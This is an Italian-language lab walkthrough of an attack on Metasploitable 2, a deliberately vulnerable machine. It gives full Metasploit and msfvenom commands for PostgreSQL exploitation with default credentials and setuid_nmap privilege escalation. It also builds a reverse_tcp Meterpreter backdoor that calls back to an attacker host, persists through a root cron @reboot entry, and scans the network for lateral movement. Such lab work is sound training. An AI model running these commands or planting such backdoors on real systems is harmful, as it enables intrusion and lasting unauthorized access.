# ğŸš€ **Penetration Testing: Metasploitable 2 - Privilege Escalation & Persistence**

## ğŸ¯ **Obiettivo**
Eseguire:
1. ğŸ” **Exploitation** di una vulnerabilitÃ  PostgreSQL su Metasploitable 2
2. ğŸ› ï¸ **Escalation di privilegi** per ottenere root
3. ğŸ” **Persistenza** tramite una backdoor
4. ğŸŒ Preparazione al **movimento laterale** e troubleshooting

---

## ğŸ” **1. Scansione e Identificazione dei Servizi**
### ğŸ› ï¸ **Scansione con Nmap**
Abbiamo effettuato una scansione per identificare i servizi vulnerabili sulla macchina **Metasploitable 2**:

```bash
nmap -sV 192.168.1.152
```

**ğŸ“Š Risultato:**
- **PostgreSQL** Ã¨ attivo sulla porta `5432/tcp` con la versione `PostgreSQL DB 8.3.0`.

---

## ğŸ’¥ **2. Exploitation: PostgreSQL**
### ğŸ¯ **Uso del modulo PostgreSQL Payload**
Abbiamo utilizzato Metasploit per sfruttare PostgreSQL e ottenere una sessione **Meterpreter**.

**âš™ï¸ Comandi usati:**
```bash
use exploit/linux/postgres/postgres_payload
set RHOST 192.168.1.152
set USERNAME postgres
set PASSWORD postgres
set LHOST 192.168.1.150
set LPORT 4445
run
```

**âœ… Risultato:**
- **Sessione Meterpreter** ottenuta con successo!

---

## ğŸ›¡ï¸ **3. Escalation di Privilegi**
### ğŸ” **Utilizzo del modulo Local Exploit Suggester**
Abbiamo identificato possibili vulnerabilitÃ  locali per l'escalation di privilegi.

**âš™ï¸ Comandi eseguiti:**
```bash
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

**ğŸ“ Exploit suggeriti:**
1. `glibc_ld_audit_dso_load_priv_esc`
2. `setuid_nmap`

### ğŸš€ **Sfruttamento dell'exploit**
Abbiamo tentato l'exploit `setuid_nmap` per ottenere i privilegi root:

```bash
use exploit/linux/local/setuid_nmap
set SESSION 1
run
```

**âœ… Risultato:**
- Escalation riuscita: utente `root` ottenuto!

**ğŸ” Verifica:**
```bash
getuid
whoami
```

---

## ğŸ” **4. Persistenza della Backdoor**
Abbiamo configurato una **backdoor persistente** per mantenere l'accesso anche dopo un riavvio.

### ğŸ› ï¸ **Creazione del Payload**
Generazione del payload con **msfvenom**:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.150 LPORT=4445 -f elf > backdoor.elf
```

### ğŸ“¤ **Caricamento del Payload**
Utilizzando Meterpreter:

```bash
upload backdoor.elf /usr/local/bin/persistence
chmod +x /usr/local/bin/persistence
```

### ğŸ•’ **Configurazione del Cron Job**
Abbiamo configurato un **cron job** per avviare la backdoor ad ogni riavvio:

```bash
echo "@reboot /usr/local/bin/persistence" >> /etc/cron.d/root_persistence
cat /etc/cron.d/root_persistence
```

**âœ… Risultato:**
- Backdoor configurata correttamente per l'avvio automatico.

---

## ğŸ”„ **5. Verifica della Persistenza**
### ğŸ”„ **Riavvio della macchina Metasploitable**
Abbiamo riavviato la macchina Metasploitable e verificato il listener Metasploit.

**ğŸ§ Listener su Kali Linux:**

```bash
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.150
set LPORT 4445
run
```

**âœ… Risultato:**
- La connessione **Meterpreter** Ã¨ stata ristabilita automaticamente.

---

## ğŸŒ **6. Troubleshooting e Movimento Laterale**
### ğŸ” **Identificazione di altre macchine nella rete**
Abbiamo utilizzato **ARP Scanner** per identificare altri host nella rete locale:

```bash
run post/multi/gather/arp_scanner
```

### ğŸ› ï¸ **Scansione delle macchine rilevate**
Abbiamo eseguito una scansione con Nmap per identificare nuovi servizi sfruttabili:

```bash
nmap -sV 192.168.1.0/24
```

---

## ğŸ **Conclusioni**
1. ğŸ¯ Ottenuta una sessione Meterpreter tramite PostgreSQL.
2. ğŸ” Escalation dei privilegi a **root** utilizzando `setuid_nmap`.
3. ğŸ” Configurata una **backdoor persistente** che sopravvive ai riavvii.
4. ğŸŒ Avviato il movimento laterale per esplorare altri host nella rete.

**ğŸš€ Prossimi Passi:**
- Automatizzare ulteriormente la persistenza.
- Sfruttare altre vulnerabilitÃ  per movimento laterale.

---

**ğŸ› ï¸ Tools utilizzati**:
- Kali Linux
- Metasploit Framework
- Nmap
- msfvenom

---

ğŸ“š **Note:** Questo documento Ã¨ stato creato per scopi didattici e di ricerca in cybersecurity.
